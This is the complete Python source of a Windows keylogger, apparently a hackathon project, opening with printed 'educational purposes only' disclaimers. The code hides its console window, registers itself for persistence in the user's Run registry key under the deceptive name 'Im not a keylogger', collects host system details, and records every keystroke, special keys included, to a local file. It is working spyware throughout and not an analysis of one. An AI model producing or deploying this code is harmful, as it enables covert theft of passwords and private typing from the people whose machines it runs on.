import os
import sys
import socket
import platform
import win32console
import win32gui
import winreg
from pynput import keyboard

print('THIS IS FOR EDUCATIONAL PURPOSES ONLY!')
print('DO NOT USE THIS ON ANY SYSTEM WITHOUT PERMISSION!')
print('I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS PROGRAM!')

print('This was made for educational purposes only by the CodeRunner RowdyHacks 2024 Team!')

LOG_FILE = 'output.txt'
STARTUP_KEY_NAME = 'Im not a keylogger'

def add_startup():
    """
    Add the file to the startup registry key if not already added.
    """
    fp = os.path.dirname(os.path.realpath(__file__))
    new_file_path = os.path.join(fp, sys.argv[0].split('\\')[-1])
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_val, 0, winreg.KEY_ALL_ACCESS) as key:
        try:
            current_value, _ = winreg.QueryValueEx(key, STARTUP_KEY_NAME)
        except FileNotFoundError:
            winreg.SetValueEx(key, STARTUP_KEY_NAME, 0, winreg.REG_SZ, new_file_path)

def hide_window():
    """
    Hide the console window 
    """
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

def get_system_info():
    """
    Gather the target systems information
    """
    system_info = [
        f"-=- System Information -=-",
        f"Hostname: {socket.gethostname()}",
        f"FQDN: {socket.getfqdn()}",
        f"System Platform: {sys.platform}",
        f"Machine: {platform.machine()}",
        f"Node: {platform.node()}",
        f"Platform: {platform.platform()}",
        f"Processor: {platform.processor()}",
        f"System OS: {platform.system()}",
        f"Release: {platform.release()}",
        f"Version: {platform.version()}",
        ""
    ]
    return '\n'.join(system_info)

def log_key(key):
    """
    Log the pressed key to the output file with extra spacing.
    """
    with open(LOG_FILE, 'a', encoding='utf-8') as file:
        if hasattr(key, 'char'):
            if key.char == ' ':
                file.write('<Space>')
                file.write(' ')
            else:
                file.write(key.char)
                file.write(' ')
        else:
            special_keys = {
                keyboard.Key.space: '<Space>',
                keyboard.Key.enter: '<Enter>',
                keyboard.Key.tab: '<Tab>',
                keyboard.Key.shift: '<Shift>',
                keyboard.Key.ctrl_l: '<Ctrl>',
                keyboard.Key.ctrl_r: '<Ctrl>',
                keyboard.Key.alt_l: '<Alt>',
                keyboard.Key.alt_r: '<Alt>',
                keyboard.Key.backspace: '<Backspace>',
                keyboard.Key.delete: '<Delete>',
                keyboard.Key.esc: '<Esc>',
                keyboard.Key.left: '<Left>',
                keyboard.Key.right: '<Right>',
                keyboard.Key.up: '<Up>',
                keyboard.Key.down: '<Down>',
                keyboard.Key.home: '<Home>',
                keyboard.Key.end: '<End>',
                keyboard.Key.page_up: '<PageUp>',
                keyboard.Key.page_down: '<PageDown>',
                keyboard.Key.insert: '<Insert>',
                keyboard.Key.print_screen: '<PrintScreen>',
                keyboard.Key.scroll_lock: '<ScrollLock>',
                keyboard.Key.pause: '<Pause>',
                keyboard.Key.f1: '<F1>',
                keyboard.Key.f2: '<F2>',
                keyboard.Key.f3: '<F3>',
                keyboard.Key.f4: '<F4>',
                keyboard.Key.f5: '<F5>',
                keyboard.Key.f6: '<F6>',
                keyboard.Key.f7: '<F7>',
                keyboard.Key.f8: '<F8>',
                keyboard.Key.f9: '<F9>',
                keyboard.Key.f10: '<F10>',
                keyboard.Key.f11: '<F11>',
                keyboard.Key.f12: '<F12>'
            }
            if key in special_keys:
                file.write(special_keys[key])
                file.write(' ')
            else:
                file.write(str(key))
                file.write(' ')

        if key == keyboard.Key.enter:
            file.write('\n\n')  # Adding extra newline for spacing between each logged event

def on_press(key):
    """
    Handle key press events.
    """
    log_key(key)

def on_release(key):
    """
    Handle key release events.
    """
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    """
    Main function to run the keylogger.
    """
    hide_window()
    add_startup()
    print("Running...")
    with open(LOG_FILE, 'w+', encoding='utf-8') as file:
        pass
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()